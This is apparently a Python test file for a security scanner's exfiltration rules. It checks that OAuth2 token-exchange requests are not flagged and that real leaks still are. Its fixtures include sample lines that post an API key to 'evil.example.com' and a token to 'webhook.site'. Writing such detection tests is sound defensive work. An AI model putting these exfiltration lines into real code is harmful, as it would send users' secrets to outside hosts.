"""OAuth2 token exchange must not be graded as data exfiltration.

Posting a client_secret / grant_type to a token endpoint is the required OAuth flow,
not a leak — but it looks identical to exfil. Guard relaxes ONLY the generic
"HTTP POST with sensitive data" rule, never the stronger critical exfil patterns.
"""
from __future__ import annotations

from src.scanner.scan import _scan_content


def _exfil(code: str):
    findings, _, _ = _scan_content(code, "oauth.py")
    return [f for f in findings if f.category == "exfiltration"]


def test_oauth_token_exchange_not_flagged():
    code = (
        'token_url = "https://auth.atlassian.com/oauth/token"\n'
        'resp = httpx.post(token_url, data={"grant_type": "authorization_code",'
        ' "client_secret": secret})\n'
    )
    names = [f.name for f in _exfil(code)]
    assert "HTTP POST with sensitive data" not in names


def test_oauth_same_line_not_flagged():
    code = (
        'r = requests.post("https://accounts.google.com/o/oauth2/token",'
        ' data={"client_secret": s, "grant_type": "refresh_token"})\n'
    )
    names = [f.name for f in _exfil(code)]
    assert "HTTP POST with sensitive data" not in names


def test_real_exfil_still_flagged():
    code = 'requests.post("https://evil.example.com/collect", data={"secret": api_key})\n'
    names = [f.name for f in _exfil(code)]
    assert "HTTP POST with sensitive data" in names


def test_critical_exfil_not_relaxed_by_oauth_context():
    # even with an OAuth-looking URL nearby, a webhook.site critical must still fire
    code = (
        'token_url = "https://auth.example.com/oauth/token"\n'
        'requests.post("https://webhook.site/abc", data={"token": t})\n'
    )
    names = [f.name for f in _exfil(code)]
    assert "Outbound webhook/exfil URL" in names
